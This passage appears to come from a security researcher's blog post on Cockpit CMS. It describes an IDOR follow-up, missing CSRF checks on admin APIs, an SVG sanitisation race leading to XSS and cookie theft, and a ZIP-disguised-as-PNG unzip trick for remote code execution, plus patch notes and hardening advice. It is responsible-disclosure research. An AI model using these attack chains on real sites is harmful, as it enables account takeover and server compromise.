+ <img alt="" class="center" src="/images/blog/multi_cockpit_vulns/cockpit-block.png"/>
+</p>
+<p>
+ The only scenario that I could think of where this was exploitable was if a developer implemented their own code that included Cockpit's bootstrap code.
+</p>
+<p>
+ I sent the following screenshot demonstrating that if the role was not being validated (either by custom code or a potential future vulnerability), then this vulnerability could be exploitable again.
+</p>
+<p>
+ <img alt="" class="center" src="/images/blog/multi_cockpit_vulns/idor-bypass.png"/>
+</p>
+<p>
+ I explained to Artur this scenario where the protection could be bypassed, and below was his response.
+</p>
+<blockquote>
+ <p>
+  Cockpit itself can also be used as library by just including the bootstrap file. So we have cases where the modules api is used eg for migration scripts or other web apps. Therefore we can’t require a user role here. It would overcomplicate things. But I have it on the radar for future development. Thank you for that.
+ </p>
+</blockquote>
+<p>
+ So beware if your web application is vulnerable to this scenario. It is extremely unlikely to occur, but it could happen.
+</p>
+<p>
+ It is also important to point that although the unauthorised access to models by exploiting the
+ <code>
+  populate
+ </code>
+ function was
+ <em>
+  patched
+ </em>
+ , the
+ <strong>
+  verifying the types of inputs to expected the type for a field has not been implemented
+ </strong>
+ . This means you can still do things such as inject a JSON object in a text field that could lead to future vulnerabilities.
+</p>
+</div>
+</div>
+</section>
+<section class="wrapper style2 alt">
+<div class="inner">
+<div class="content">
+
+<h1 class="major" id="csrf-everywhere">
+ CSRF Everywhere...
+</h1>
+<p>
+ After finding the IDOR vulnerability, I decided to continue looking at Cockpit CMS a bit further. I continued just interacting with the admin portal, looking through the requests when I noticed something
+ <strong>
+  very important
+ </strong>
+ was missing when I tried uploading a file using the
+ <strong>
+  Assets
+ </strong>
+ API...
+</p>
+<p>
+ <img alt="" class="center" src="/images/blog/multi_cockpit_vulns/where-is-csrf.png"/>
+</p>
+<p>
+ <em>
+  Where on earth is the CSRF token validation for this file upload?
+ </em>
+</p>
+<p>
+ <img alt="" class="center" src="/images/blog/multi_cockpit_vulns/gorilla-stare.gif"/>
+</p>
+<p>
+ I started looking through the documentation to see if I accidentally misconfigured my Cockpit CMS server. Unfortunately, it turned out that the admin portal was never given the CSRF protection unlike the general API and
+ <strong>
+  every admin API action was vulnerable to CSRF
+ </strong>
+ !
+</p>
+<p>
+ Well that isn't great at all, especially considering that there is multiple methods to exploit these CSRF vulnerabilities to upload dangerous files:
+</p>
+<ul>
+ <li>
+  <p>
+   <strong>
+    Assets API
+   </strong>
+   : The Assets API is the recommended admin API for managing files on Cockpit CMS that somewhat restricts what type of files can be uploaded. However, on a default installation any file type except
+   <code>
+    .php
+   </code>
+   ,
+   <code>
+    .phar
+   </code>
+   and
+   <code>
+    .phtml
+   </code>
+   files.
+  </p>
+ </li>
+ <li>
+  <p>
+   <strong>
+    Finder API
+   </strong>
+   : The Finder API is specifically just for administrator users that are assigned the
+   <code>
+    admin
+   </code>
+   role. It consists of a tonne of dangerous functions for
+   <strong>
+    directly interacting with the file system
+   </strong>
+   and contains
+   <em>
+    'features'
+   </em>
+   such as
+   <code>
+    writeFile
+   </code>
+   for
+   <strong>
+    writing into PHP files
+   </strong>
+   . These functions cannot be disabled and can be easily exploited on a default installation of Cockpit CMS. By default, it also allows uploading
+   <strong>
+    *.php
+   </strong>
+   , so it has RCE as a feature.
+  </p>
+ </li>
+</ul>
+<p>
+ Those are some very dangerous default settings for a CMS. However, there are configuration settings that can be enabled that should of mitigated the likelihood of exploiting file upload vulnerabilities.
+</p>
+<p>
+ <em>
+  Let's harden my test server and see if I can still exploit these vulnerabilities.
+ </em>
+</p>
+</div>
+</div>
+</section>
+<section class="wrapper style1 ">
+<div class="inner">
+<div class="content">
+
+<h2 class="major" id="lets-play-a-game">
+ Let's Play a Game
+</h2>
+<p>
+ So I decided to play a game and harden my configuration of Cockpit CMS. So the following rules I have set for myself looking into this issue:
+</p>
+<ol>
+ <li>
+  <p>
+   Only allow uploading file extensions of image file types (eg.
+   <code>
+    .png
+   </code>
+   ,
+   <code>
+    .jpg
+   </code>
+   ,
+   <code>
+    .jpeg
+   </code>
+   and
+   <code>
+    .svg
+   </code>
+   ).
+  </p>
+ </li>
+ <li>
+  <p>
+   I am not allowed to use the
+   <code>
+    writeFile
+   </code>
+   action in the Finder API to overwrite a PHP file to get RCE.
+  </p>
+ </li>
+</ol>
+<p>
+ I can restrict the allowed extensions with the following configuration settings.
+</p>
+<div class="codehilite">
+ <pre><span></span><code><span class="x">/**</span>
+<span class="x"> * Only allow files with the 'png, jpg, jpeg, svg' extension to be uploaded</span>
+<span class="x"> */</span>
+
+<span class="x">// Assets API</span>
+<span class="x">'assets' =&gt; [</span>
+<span class="x">    'allowed_uploads' =&gt; 'png, jpg, jpeg, svg'</span>
+<span class="x">],</span>
+
+<span class="x">// Finder API</span>
+<span class="x">'finder.allowed_uploads' =&gt; 'png, jpg, jpeg, svg',</span>
+</code></pre>
+</div>
+<p>
+ However, I could not disable the
+ <code>
+  writeFile
+ </code>
+ action for the Finder API so I just deleted the function from
+ <code>
+  modules/Finder/Controller/Finder.php
+ </code>
+ on my server.
+</p>
+<p>
+ <img alt="" class="center" src="/images/blog/multi_cockpit_vulns/after-saw.gif"/>
+</p>
+</div>
+</div>
+</section>
+<section class="wrapper style6 alt">
+<div class="inner">
+<div class="content">
+
+<h2 class="major" id="csrf-to-xss">
+ CSRF to XSS
+</h2>
+<p>
+ First I will look at the Assets API and see if I can leverage CSRF on Cockpit CMS to achieve XSS. Now some of you might of noticed I slightly
+ <em>
+  cheated
+ </em>
+ with my rule and allowed uploading SVG files, that can be used to
+ <a href="https://developer.mozilla.org/en-US/docs/Web/SVG">
+  run arbitrary JavaScript when a victim views the file
+ </a>
+ . Well it isn't cheating because I made up the game so I can chose my own rules.
+</p>
+<p>
+ Anyway, it
+ <em>
+  should of not mattered
+ </em>
+ since Cockpit CMS sanitised SVG files using
+ <code>
+  \SVGSanitizer::clean
+ </code>
+ in the following code from
+ <code>
+  modules/Assets/bootstrap.php
+ </code>
+ .
+</p>
+<div class="codehilite">
+ <pre><span></span><code><span class="x">...</span>
+
+<span class="x">$_file  = $this-&gt;app-&gt;path('#tmp:').'/'.$files['name'][$i];</span>
+<span class="x">$_isAllowed = $allowed === true ? true : preg_match("/\.({$allowed})$/i", $_file);</span>
+<span class="x">$_sizeAllowed = $max_size ? filesize($files['tmp_name'][$i]) &lt; $max_size : true;</span>
+
+<span class="x">// prevent uploading php files</span>
+<span class="x">if ($_isAllowed &amp;&amp; in_array(strtolower(pathinfo($_file, PATHINFO_EXTENSION)), ['php', 'phar', 'phtml'])) {</span>
+<span class="x">    $_isAllowed = false;</span>
+<span class="x">}</span>
+
+<span class="x">if (!$files['error'][$i] &amp;&amp; $_isAllowed &amp;&amp; $_sizeAllowed &amp;&amp; move_uploaded_file($files['tmp_name'][$i], $_file)) {</span>
+
+<span class="x">    $_files[]   = $_file;</span>
+<span class="x">    $uploaded[] = $files['name'][$i];</span>
+
+<span class="x">    if (\preg_match('/\.(svg|xml)$/i', $_file)) {</span>
+<span class="x">        file_put_contents($_file, \SVGSanitizer::clean(\file_get_contents($_file)));</span>
+<span class="x">    }</span>
+
+<span class="x">} else {</span>
+<span class="x">    $failed[] = $files['name'][$i];</span>
+<span class="x">}</span>
+
+<span class="x">...</span>
+</code></pre>
+</div>
+<p>
+ However, there is a mistake in the order of operations during this sanitisation process. Firstly, the file is
+ <strong>
+  moved from the temporary file upload directory set by PHP to
+  <code>
+   storage/tmp
+  </code>
+  on the server
+ </strong>
+ (code
+ <code>
+  move_uploaded_file($files['tmp_name'][$i], $_file)
+ </code>
+ ). Then it is sanitised using
+ <code>
+  \SVGSanitizer::clean
+ </code>
+ .
+</p>
+<p>
+ This causes a
+ <em>
+  very very very small
+ </em>
+ time window where the uploaded SVG file can be accessed from
+ <code>
+  /storage/tmp
+ </code>
+ on the website and
+ <code>
+  \SVGSanitizer::clean
+ </code>
+ has not completed sanitising the file. You can increase this time window by simply uploading a larger SVG file.
+</p>
+<p>
+ Perfect! I now have a self XSS vulnerability that I can combine with the CSRF vulnerability to build an exploit.
+</p>
+<h3 class="major" id="csrf-to-xss-poc">
+ CSRF to XSS POC
+</h3>
+<p>
+ The process of exploitation is:
+</p>
+<ol>
+ <li>
+  <p>
+   When a victim user submits form on your malicious external website, first open a new tab to the malicious HTML code for step 2 and then upload a large SVG file with your JavaScript payload using the Asset API.
+  </p>
+ </li>
+ <li>
+  <p>
+   On the second tab that is opened, wait for a little bit then
+   <em>
+    yeet
+   </em>
+   the victim straight into uploaded SVG file in
+   <code>
+    /storage/tmp
+   </code>
+   before it is sanitised.
+  </p>
+ </li>
+</ol>
+<p>
+ The following POC GIF demonstrates doing this CSRF to XSS exploit and stealing the victim user's session cookie.
+</p>
+<p>
+ <img alt="" class="center" src="/images/blog/multi_cockpit_vulns/cockpit-csrf-xss.gif"/>
+</p>
+</div>
+</div>
+</section>
+<section class="wrapper style3 ">
+<div class="inner">
+<div class="content">
+
+<h2 class="major" id="csrf-to-rce">
+ CSRF to RCE
+</h2>
+<p>
+ So I had achieved leveraging the CSRF vulnerability to get XSS, but
+ <em>
+  I want some of that juicy RCE
+ </em>
+ .
+</p>
+<p>
+ So next I decided switch to the Finder API and figure out a method to achieve RCE while restricting file uploads to only image file extensions and not allowing the use of
+ <code>
+  writeFile
+ </code>
+ .
+</p>
+<p>
+ Once again I
+ <em>
+  slightly
+ </em>
+ cheated and did not disallow using the
+ <code>
+  unzip
+ </code>
+ Finder API action. I will go with the excuse that unzipping a file does not appear to be obviously dangerous unlike modifying content files like
+ <code>
+  writeFile
+ </code>
+ did. The source code for
+ <code>
+  unzip
+ </code>
+ is shown below from
+ <code>
+  modules/Finder/Controller/Finder.php
+ </code>
+ .
+</p>
+<div class="codehilite">
+ <pre><span></span><code><span class="x">protected function unzip() {</span>
+
+<span class="x">$path    = $this-&gt;_getPathParameter();</span>
+
+<span class="x">if (!$path) return false;</span>
+
+<span class="x">$return  = ['success' =&gt; false];</span>
+<span class="x">$zip     = $this-&gt;param('zip', false);</span>
+
+<span class="x">if ($path &amp;&amp; $zip) {</span>
+
+<span class="x">    $path =  $this-&gt;root.'/'.trim($path, '/');</span>
+<span class="x">    $zip  =  $this-&gt;root.'/'.trim($zip, '/');</span>
+
+<span class="x">    $za = new \ZipArchive;</span>
+
+<span class="x">    if ($za-&gt;open($zip)) {</span>
+
+<span class="x">        if ($za-&gt;extractTo($path)) {</span>
+<span class="x">            $return = ['success' =&gt; true];</span>
+<span class="x">        }</span>
+
+<span class="x">        $za-&gt;close();</span>
+<span class="x">    }</span>
+<span class="x">}</span>
+
+<span class="x">return json_encode($return);</span>
+<span class="x">}</span>
+</code></pre>
+</div>
+<p>
+ The
+ <code>
+  unzip
+ </code>
+ function does not
+ <strong>
+  validate if the file being extracted is even a
+  <code>
+   .zip
+  </code>
+  file
+ </strong>
+ , meaning that you can just use this Finder API action to extract any
+ <code>
+  .php
+ </code>
+ file from a ZIP archive!
+</p>
+<p>
+ However, the Finder API uses JSON requests that would make this not vulnerable to CSRF :/.
+</p>
+<p>
+ <img alt="" class="center" src="/images/blog/multi_cockpit_vulns/finder-json.png"/>
+</p>
+<p>
+ <em>
+  Did I give up there?
+ </em>
+ <strong>
+  NOPE!
+ </strong>
+</p>
+<p>
+ I simply attempted the same request, but changed the
+ <code>
+  Content-Type
+ </code>
+ to
+ <code>
+  application/x-www-form-urlencoded
+ </code>
+ .
+</p>
+<p>
+ <img alt="" class="center" src="/images/blog/multi_cockpit_vulns/json-csrf-bypass.png"/>
+</p>
+<p>
+ Perfect! Since
+ <code>
+  application/x-www-form-urlencoded
+ </code>
+ can be used instead of
+ <code>
+  application/json
+ </code>
+ it means that I could still exploit the CSRF vulnerability.
+</p>
+<p>
+ <em>
+  Let's get into that POC since that is what everyone has probably skipped to.
+ </em>
+</p>
+<h3 class="major" id="csrf-to-rce-poc">
+ CSRF to RCE POC
+</h3>
+<p>
+ So the process of exploitation is fairly simple:
+</p>
+<ol>
+ <li>
+  <p>
+   When a victim admin user browsers your malicious external website and submits a form, first open a separate tab for the payload in step 2 then upload a ZIP file named
+   <code>
+    exploit.png
+   </code>
+   that contains your
+   <code>
+    .php
+   </code>
+   payload.
+  </p>
+ </li>
+ <li>
+  <p>
+   On the second tab, wait for a bit then auto submit a form to
+   <code>
+    unzip
+   </code>
+   the uploaded
+   <code>
+    exploit.png
+   </code>
+   .
+  </p>
+ </li>
+ <li>
+  <p>
+   Visit the extracted
+   <code>
+    .php
+   </code>
+   payload to get unauthenticated RCE.
+  </p>
+ </li>
+ <li>
+  <p>
+   <em>
+    ?Profit?
+   </em>
+  </p>
+ </li>
+</ol>
+<p>
+ The following POC GIF demonstrates getting RCE by targetting a Cockpit administrator user.
+</p>
+<p>
+ <img alt="" class="center" src="/images/blog/multi_cockpit_vulns/cockpit-csrf-rce.gif"/>
+</p>
+</div>
+</div>
+</section>
+<section class="wrapper style5 alt">
+<div class="inner">
+<div class="content">
+
+<h2 class="major" id="how-cockpit-cms-patched-this-vulnerability_1">
+ How Cockpit CMS Patched This Vulnerability
+</h2>
+<p>
+ The interesting thing was that Cockpit CMS did have a mechanism for CSRF token validation, just it was not implemented for the admin API. Artur added the CSRF token validation for the admin API actions within a day after my initial report (
+ <a href="https://github.com/Cockpit-HQ/Cockpit/commit/ef00d03ea1d50921976c3f163fc89bce6e813e9a">
+  Github commit
+ </a>
+ ). However, I do still have some concerns with how Artur patched these vulnerabilities.
+</p>
+<p>
+ Firstly, the CSRF token validation method requires adding
+ <code>
+  $this-&gt;hasValidCsrfToken(true);
+ </code>
+ to each route for the internal API. This means that this vulnerability could be reintroduced again for a route if the
+ <code>
+  $this-&gt;hasValidCsrfToken(true);
+ </code>
+ was forgotten.
+</p>
+<p>
+ Secondly, the Finder API is basically
+ <strong>
+  file upload to RCE
+ </strong>
+ as a feature for Cockpit CMS administrators. I brought this up to Artur and he agreed that it is a powerful feature and that's why only administrator users have permission to use it. He did say just 'delete the finder folder in
+ <code>
+  /modules
+ </code>
+ if you're uncomfortable' (which I personally recommend for hardening your Cockpit CMS server).
+</p>
+<p>
+ Finally, the race condition issue that I exploited in the SVG file upload process using the Assets API is still not patched. However, since the CSRF vulnerability has been patched this is now only a self-XSS.
+</p>
+</div>
+</div>
+</section>
+<section class="wrapper style2 ">
+<div class="inner">
+<div class="content">
+
+<h1 class="major" id="a-note-about-secure-by-default-and-documenting-configuration-settings">
+ A Note About Secure by Default and Documenting Configuration Settings
+</h1>
+<p>
+ One of my major concerns going through Cockpit CMS was that the default settings were
+ <strong>
+  insecure
+ </strong>
+ and could potentially lead to achieving
+ <strong>
+  XSS or RCE
+ </strong>
+ (as I demonstrated above even with
+ <em>
+  hardened
+ </em>
+ settings). Normally I don't report insecure defaults, since the responsibility of setting secure configuration settings is on the user.
+</p>
+<p>
+ However, the documentation should at least highlight best practices or important configuration settings to inform users about how to secure their servers.
+ <a href="https://getcockpit.com/documentation/core/quickstart/configuration">
+  Cockpit CMS's official documentation does not have any of these recommendations
+ </a>
+ , and only provided a basic configuration file (which enables uploading dangerous file types using the Assets and Finder API)
+</p>
+<p>
+ <img alt="" class="center" src="/images/blog/multi_cockpit_vulns/cockpit-docs.png"/>
+</p>
+<p>
+ The only
+ <em>
+  'complete'
+ </em>
+ documentation about configuring Cockpit CMS I could find was on
+ <a href="https://zeraton.gitlab.io/cockpit-docs/guide/basics/configuration.html#introduction">
+  this gitlab website by Zeraton
+ </a>
+ that was last updated in
+ <strong>
+  2019
+ </strong>
+ . Therefore, I felt obliged to document some configuration settings for hardening your Cockpit CMS servers.
+</p>
+<h2 class="major" id="setting-an-allow-list-for-assets-api-uploads">
+ Setting an Allow List for Assets API Uploads
+</h2>
+<p>
+ As previously mentioned, the Assets API is the
+ <em>
+  secure
+ </em>
+ and
+ <em>
+  recommended
+ </em>
+ alternative for file uploads on Cockpit CMS. However, by default it allows uploading any file with the only exception that
+ <code>
+  .php
+ </code>
+ ,
+ <code>
+  .phar
+ </code>
+ and
+ <code>
+  .phtml
+ </code>
+ file extensions not being allowed. Instead, an allow list should be configured to restrict the allowed file extensions on Cockpit CMS. For an example, the following configuration setting only allows the upload of
+ <code>
+  .png
+ </code>
+ ,
+ <code>
+  .jpg
+ </code>
+ and
+ <code>
+  .jpeg
+ </code>
+ file extensions using the Assets API.
+</p>
+<p>
+ <em>
+  Put in
+  <code>
+   config/config.php
+  </code>
+ </em>
+</p>
+<div class="codehilite">
+ <pre><span></span><code><span class="x">    /**</span>
+<span class="x">     * Only allow files with the 'png, jpg, jpeg, svg' extension to be uploaded</span>
+<span class="x">     */</span>
+
+<span class="x">    // Assets API</span>
+<span class="x">    'assets' =&gt; [</span>
+<span class="x">        'allowed_uploads' =&gt; 'png, jpg, jpeg'</span>
+<span class="x">    ],</span>
+</code></pre>
+</div>
+<h2 class="major" id="how-to-secure-the-finder-api">
+ How to secure the Finder API?
+</h2>
+<p>
+ The Finder API can be easily exploited by a Cockpit CMS administrator to achieve RCE. I have also demonstrated in my above ramblings that even the
+ <code>
+  finder.allowed_uploads
+ </code>
+ setting cannot prevent RCE, since it can be bypassed using
+ <strong>
+  dangerous
+ </strong>
+ built in actions such as
+ <code>
+  writeFile
+ </code>
+ or
+ <code>
+  unzip
+ </code>
+ .
+</p>
+<p>
+ If you are really want to harden your Cockpit CMS website, I recommend just deleting the
+ <code>
+  modules/Finder
+ </code>
+ folder.
+</p>
+<p>
+ <img alt="" class="center" src="/images/blog/multi_cockpit_vulns/rmrf-Finder.gif"/>
+</p>
+<p>
+ Artur from Cockpit CMS is fully aware of the security issues of the Finder API and also recommended deleting the
+ <code>
+  modules/Finder
+ </code>
+ in my communication with him.
+</p>
+<h2 class="major" id="change-your-application-security-keys">
+ Change Your Application Security Keys!
+</h2>
+<p>
+ If you do not create a custom
+ <code>
+  config/config.php
+ </code>
+ configuration file and use a secure
+ <strong>
+  <code>
+   sec-key
+  </code>
+ </strong>
+ , then your application will be using a default secret key that is hardcoded into the application! You can find these default application secret keys by searching for
+ <code>
+  sec-key
+ </code>
+ in Cockpit CMS.
+</p>
+<p>
+ <img alt="" class="center" src="/images/blog/multi_cockpit_vulns/default-key.png"/>
+</p>
+<h2 class="major" id="harden-php-session-cookies">
+ Harden PHP Session Cookies
+</h2>
+<p>
+ Cockpit CMS uses the builtin PHP session cookie for session authentication on the administrator portal. However, you need to secure your PHP sessions by properly configuring your PHP ini configuration file. For an example, if
+ <code>
+  session.cookie_httponly
+ </code>
+ is not set then JavaScript code can access a user's session cookie and makes XSS attacks significantly easier.
+ <a href="https://www.php.net/manual/en/session.security.ini.php">
+  PHP has additional documentation about recommended settings for securing session cookies
+ </a>
+ .
+</p>
+</div>
+</div>
+</section>
+<section class="wrapper style3 alt">
+<div class="inner">
+<div class="content">
+
+<h1 class="major" id="conclusion">
+ Conclusion
+</h1>
+<p>
+ To conclude, I do want to give a huge shout out to Artur at Cockpit CMS for quickly responding and patching both of these vulnerabilities. So far, he has the record for the fastest patch I have seen for an open source project.
+</p>
+<p>
+ Saying that, from my brief vulnerability research into Cockpit CMS there can be more done to improve the security of the CMS. Both of the patches were effective at remediating the
+ <strong>
+  root cause
+ </strong>
+ for the vulnerabilities I reported. However, the patches were not complete since they do not prevent circumstantial edge cases or fix the issues of input validation that enabled these vulnerabilities in the first place. At the time of writing this article, there was no official documentation about hardening Cockpit CMS as well.
+</p>
+<p>
+ I wish I had more time to properly look through Cockpit CMS and conduct a more thorough review. Saying that, I do hope this article inspires other developers and security researchers to help Artur out with securing CMS.
+</p></div>
+</div>
+</section>
+</section>
+
+    	</div>
+
+    <!-- Footer -->
+      <!-- Footer -->
+  <section id="footer">
+    <div class="inner">
+      <ul class="icons">
+        <li><a href="https://twitter.com/GhostCcamm" class="icon brands fa-twitter"><span class="label"></span></a></li>
+        <li><a href="https://github.com/Ccamm" class="icon brands fa-github"><span class="label"></span></a></li>
+      </ul>
+    </div>
+  </section>
+
+		<!-- Particles -->
+			<div id="particles-js"></div>
+
+		<!-- Scripts -->
+			<script src="/assets/js/jquery.min.js"></script>
+			<script src="/assets/js/jquery.scrollex.min.js"></script>
+			<script src="/assets/js/browser.min.js"></script>
+			<script src="/assets/js/breakpoints.min.js"></script>
+			<script src="/assets/js/util.js"></script>
+			<script src="/assets/js/particles.min.js"></script>
+			<script src="/assets/js/main.js"></script>
+      
+	</body>
+</html>
